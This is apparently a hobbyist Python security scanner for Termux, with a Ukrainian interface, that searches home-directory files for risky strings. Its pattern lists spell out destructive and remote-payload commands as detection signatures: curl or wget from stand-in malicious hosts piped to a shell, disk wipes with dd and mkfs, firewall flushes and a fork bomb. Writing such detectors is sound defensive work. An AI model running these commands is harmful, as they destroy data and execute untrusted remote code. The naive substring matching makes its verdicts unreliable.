#!/data/data/com.termux/files/usr/bin/bash
import os
import sys
import time

# ============================================
#   TBFPUMBA-SckanerOp v3.0
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

SUSPICIOUS_PATTERNS = [
    "rm -rf",
    "format",
    "delete_all",
    "malware",
    "virus"
]

HIGH_RISK_PATTERNS = [
    "rm -rf --no-preserve-root",
    "dd if=/dev/zero of=/dev/block",
    "mkfs.ext4 /dev/block",
    "chmod 777 /system",
    "mount -o rw,remount /system",
    "curl http://malicious-site.com/install.sh | bash",
    "wget https://evil-domain.com/payload.sh | sh",
    "base64 -d | sh",
    "eval $(cat /dev/urandom | base64)",
    "iptables -F",
    "iptables -X",
    "killall -9",
    "pkill -f",
    ":(){ :|:& };:"
]

def show_help():
    os.system('clear')
    print("📖 TBFPUMBA-SckanerOp — Довідка")
    print("========================================")
    print("🛡️  Про програму:")
    print("  Сканер безпеки для виявлення підозрілих")
    print("  та критичних загроз у файлах Termux.")
    print("")
    print("🚀  Як запустити:")
    print("  python tbfpumba_scan.py")
    print("")
    print("⚙️  Команди:")
    print("  help  — показати це керівництво")
    print("  y     — запустити сканування")
    print("  n     — вийти")
    print("")
    print("📂  Що сканується:")
    print("  Файли з розширеннями: .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh")
    print("")
    print("🔴  Рівні загроз:")
    print("  🔴 Критична — може пошкодити систему")
    print("  🟡 Підозріла — потребує перевірки")
    print("")
    print("🔒  Безпека:")
    print("  Сканер не змінює файли, тільки аналізує.")
    print("========================================")
    input("\nНатисніть Enter, щоб закрити довідку...")

def loading_animation_scan():
    print("\n📂 Сканування файлів...\n")
    for i in range(101):
        time.sleep(0.01)
        bar = "█" * (i // 2) + "░" * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
    print("\n✅ Аналіз завершено!\n")

def loading_animation_init():
    print("\n🔍 Ініціалізація сканера...")
    for i in range(101):
        time.sleep(0.02)
        print(f"\r[{ '█' * (i//2) }{ '░' * (50 - i//2) }] {i}%", end="")
    print("\n✅ Готово до роботи!\n")

def ask_user():
    while True:
        answer = input("⚠️ Запустити сканування? (y/n/help): ").lower()
        if answer in ['y', 'yes']:
            return True
        elif answer in ['n', 'no']:
            print("❌ Сканування скасовано.")
            sys.exit()
        elif answer == 'help':
            show_help()
            continue
        else:
            print("❗ Введіть 'y', 'n' або 'help'.")

def scan_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            for pattern in HIGH_RISK_PATTERNS:
                if pattern in content:
                    return "🔴", pattern
            for pattern in SUSPICIOUS_PATTERNS:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_folder(path):
    suspicious_files = []
    print(f"\n📂 Сканування папки: {path}\n")
    loading_animation_scan()
    for root, dirs, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath == os.path.realpath(__file__):
                continue
            if file.endswith(('.txt', '.sh', '.py', '.js', '.c', '.cpp', '.bash', '.zsh')):
                level, pattern = scan_file(filepath)
                if level:
                    suspicious_files.append((filepath, level, pattern))
                    if level == "🔴":
                        print(f"🔴 КРИТИЧНА ЗАГРОЗА: {filepath} (знайдено: '{pattern}')")
                    else:
                        print(f"🟡 ПІДОЗРІЛИЙ ФАЙЛ: {filepath} (знайдено: '{pattern}')")
    return suspicious_files

if __name__ == "__main__":
    os.system('clear')
    print("🔥 TBFPUMBA-SckanerOp v3.0 🔥")
    print("⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡")
    print("========================================")
    
    loading_animation_init()
    if not ask_user():
        sys.exit()
    
    target_path = os.path.expanduser("~")
    results = scan_folder(target_path)
    
    if results:
        critical = [r for r in results if r[1] == "🔴"]
        suspicious = [r for r in results if r[1] == "🟡"]
        
        if critical:
            print("\n🔴🔴🔴 КРИТИЧНІ ЗАГРОЗИ:")
            for file, level, pattern in critical:
                print(f"  🔴 {file} (патерн: {pattern})")
        if suspicious:
            print("\n🟡 ПІДОЗРІЛІ ФАЙЛИ:")
            for file, level, pattern in suspicious:
                print(f"  🟡 {file} (патерн: {pattern})")
        print("\n⚠️ Рекомендується перевірити ці файли.")
    else:
        print("\n✅ Підозрілих файлів не знайдено. Ваша система чиста!")
    
    print("\n🔒 Сканування завершено.")
    input("Натисніть Enter, щоб вийти...")
